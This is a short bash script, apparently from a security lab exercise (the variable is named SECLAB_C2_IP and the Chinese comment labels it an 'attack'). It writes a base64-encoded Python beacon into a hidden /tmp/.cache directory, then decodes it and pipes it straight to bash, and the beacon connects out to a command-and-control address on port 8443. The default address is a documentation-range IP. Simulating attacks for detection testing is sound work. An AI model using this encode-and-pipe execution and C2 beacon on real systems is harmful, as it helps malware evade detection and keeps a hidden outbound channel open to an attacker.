#!/usr/bin/env bash
# attack（窗口内）：编码载荷落盘，解码管道执行（明文不落盘）并外连。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
PAYLOAD="python3 -c 'import socket,time; s=socket.create_connection((\"'$C2_IP'\",8443)); s.sendall(b\"beacon\"); time.sleep(2)'"
printf '%s' "$PAYLOAD" | base64 -w0 > /tmp/.cache/beacon/beacon.enc
base64 -d /tmp/.cache/beacon/beacon.enc | bash
